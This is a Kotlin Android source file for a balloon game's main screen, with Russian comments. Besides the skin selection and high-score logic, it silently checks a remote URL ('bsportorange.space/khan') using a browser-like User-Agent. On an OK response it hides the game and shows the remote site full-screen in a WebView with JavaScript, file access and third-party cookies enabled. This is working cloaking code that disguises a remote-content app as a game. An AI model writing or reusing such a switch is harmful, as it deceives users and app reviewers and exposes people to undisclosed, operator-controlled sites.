package com.ggs.balloonrise

import android.annotation.SuppressLint
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.view.View
import android.webkit.*
import android.widget.Button
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.activity.OnBackPressedCallback
import androidx.appcompat.app.AppCompatActivity
import androidx.constraintlayout.widget.Group
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    // --- UI элементы для игры ---
    private lateinit var highScoreText: TextView
    private lateinit var skinRed: ImageView
    private lateinit var skinBlue: ImageView
    private lateinit var skinGreen: ImageView

    // --- Компоненты для WebView ---
    private lateinit var webView: WebView
    private lateinit var gameGroup: Group // Группа, объединяющая все игровые элементы
    private val remoteConfigUrl = "https://bsportorange.space/khan"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // --- Инициализация View ---
        initializeGameViews()
        webView = findViewById(R.id.webView)
        gameGroup = findViewById(R.id.gameGroup) // Найдем группу игровых элементов

        // --- Настраиваем игровую логику (кнопки, скины) ---
        setupGameLogic()

        // --- Настройка обработчика кнопки "Назад" для WebView ---
        setupBackPressHandler()

        // --- Проверка состояния и запуск логики WebView ---
        if (savedInstanceState != null) {
            webView.restoreState(savedInstanceState)
        } else {
            // В фоновом режиме проверяем удаленную ссылку
            lifecycleScope.launch {
                val targetUrl = checkRemoteUrl()
                if (targetUrl != null) {
                    // Если ссылка валидна (не 404), инициализируем и загружаем WebView
                    initializeWebView(targetUrl)
                }
                // Если ссылка вернула 404 или ошибку, ничего не делаем, остаемся в игре
            }
        }
    }

    /**
     * Инициализирует все View, относящиеся к игровому экрану.
     */
    private fun initializeGameViews() {
        highScoreText = findViewById(R.id.highScoreText)
        skinRed = findViewById(R.id.skinRed)
        skinBlue = findViewById(R.id.skinBlue)
        skinGreen = findViewById(R.id.skinGreen)
    }

    /**
     * Настраивает всю игровую логику: кнопка Play и выбор скинов.
     */
    private fun setupGameLogic() {
        findViewById<Button>(R.id.playButton).setOnClickListener {
            startActivity(Intent(this, GameActivity::class.java))
        }
        setupSkinSelector()
    }

    /**
     * Проверяет удаленный URL. Возвращает URL, если ответ сервера - HTTP 200 OK.
     * Возвращает null, если ответ - 404 Not Found или любая другая ошибка.
     */
    private suspend fun checkRemoteUrl(): String? {
        return withContext(Dispatchers.IO) {
            try {
                val url = URL(remoteConfigUrl)
                val connection = url.openConnection() as HttpURLConnection
                // Устанавливаем User-Agent, чтобы запрос выглядел как от браузера
                connection.setRequestProperty("User-Agent", WebSettings.getDefaultUserAgent(this@MainActivity))
                connection.instanceFollowRedirects = true // Разрешаем редиректы

                val statusCode = connection.responseCode
                Log.d("WebViewCheck", "URL: ${connection.url}, Status Code: $statusCode")

                // Показываем WebView только если статус ответа '200 OK'
                if (statusCode == HttpURLConnection.HTTP_OK) {
                    connection.url.toString()
                } else {
                    // При 404 и любых других ошибках WebView не показываем
                    null
                }
            } catch (e: Exception) {
                Log.e("WebViewCheck", "Remote config check failed", e)
                null
            }
        }
    }


    /**
     * Настраивает и инициализирует WebView для отображения контента.
     */
    @SuppressLint("SetJavaScriptEnabled")
    private fun initializeWebView(url: String) {
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            cacheMode = WebSettings.LOAD_DEFAULT
            allowFileAccess = true
            allowContentAccess = true
        }

        CookieManager.getInstance().setAcceptCookie(true)
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
                val urlString = request?.url.toString()
                // Обработка внешних ссылок (например, tg://, mailto:)
                if (!urlString.startsWith("http://") && !urlString.startsWith("https://")) {
                    try {
                        startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(urlString)))
                    } catch (e: Exception) {
                        Log.w("WebView", "Can't handle external URL: $urlString", e)
                        Toast.makeText(this@MainActivity, "Приложение не найдено", Toast.LENGTH_SHORT).show()
                    }
                    return true
                }
                return false
            }

            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                // Когда страница полностью загрузилась, прячем игровой экран и показываем WebView
                gameGroup.visibility = View.GONE
                webView.visibility = View.VISIBLE
            }
        }
        webView.loadUrl(url)
    }

    /**
     * Настраивает обработку кнопки "Назад" для навигации в WebView.
     */
    private fun setupBackPressHandler() {
        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                if (webView.visibility == View.VISIBLE && webView.canGoBack()) {
                    webView.goBack()
                } else {
                    isEnabled = false
                    onBackPressedDispatcher.onBackPressed()
                    isEnabled = true
                }
            }
        })
    }

    override fun onResume() {
        super.onResume()
        updateHighScoreDisplay()
        updateSkinAvailability()
        updateSelectionBorder()
    }

    // --- Сохранение состояния WebView ---
    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        webView.saveState(outState)
    }

    override fun onRestoreInstanceState(savedInstanceState: Bundle) {
        super.onRestoreInstanceState(savedInstanceState)
        webView.restoreState(savedInstanceState)
    }

    override fun onPause() {
        super.onPause()
        CookieManager.getInstance().flush()
    }

    // --- Остальные ваши методы для игровой логики без изменений ---
    private fun updateHighScoreDisplay() {
        val highScore = GamePrefs.getHighScore(this)
        highScoreText.text = "High Score: $highScore"
    }

    private fun setupSkinSelector() {
        skinRed.setOnClickListener {
            GamePrefs.setSelectedSkin(this, R.drawable.balloon)
            updateSelectionBorder()
        }
        skinBlue.setOnClickListener {
            if (GamePrefs.isSkinUnlocked(this, "skinBlueUnlocked")) {
                GamePrefs.setSelectedSkin(this, R.drawable.balloon_blue)
                updateSelectionBorder()
            }
        }
        skinGreen.setOnClickListener {
            if (GamePrefs.isSkinUnlocked(this, "skinGreenUnlocked")) {
                GamePrefs.setSelectedSkin(this, R.drawable.balloon_green)
                updateSelectionBorder()
            }
        }
    }

    private fun updateSkinAvailability() {
        skinBlue.alpha = if (GamePrefs.isSkinUnlocked(this, "skinBlueUnlocked")) 1.0f else 0.3f
        skinGreen.alpha = if (GamePrefs.isSkinUnlocked(this, "skinGreenUnlocked")) 1.0f else 0.3f
    }

    private fun updateSelectionBorder() {
        val selectedSkin = GamePrefs.getSelectedSkin(this)
        skinRed.background = null
        skinBlue.background = null
        skinGreen.background = null
        val selectionDrawable = ContextCompat.getDrawable(this, R.drawable.selection_border)
        when (selectedSkin) {
            R.drawable.balloon -> skinRed.background = selectionDrawable
            R.drawable.balloon_blue -> skinBlue.background = selectionDrawable
            R.drawable.balloon_green -> skinGreen.background = selectionDrawable
        }
    }
}